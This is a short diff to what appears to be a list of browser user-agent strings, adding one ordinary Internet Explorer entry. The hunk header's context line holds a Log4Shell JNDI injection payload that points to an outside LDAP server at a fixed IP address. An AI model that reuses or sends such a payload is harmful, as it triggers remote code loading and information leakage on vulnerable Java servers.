@@ -7448,3 +7448,4 @@ ${jndi:ldap://45.135.194.44:1389/M0SygVAAAQDjSv5oAAAAAJPCEhg/${java:os};~${java:
 Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; NP08; MAAU; rv:11.0 like Gecko)
 Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MALC; rv:11.0 like Gecko)
 Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALCJS; rv:11.0 like Gecko)
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MAAU; MAAU)
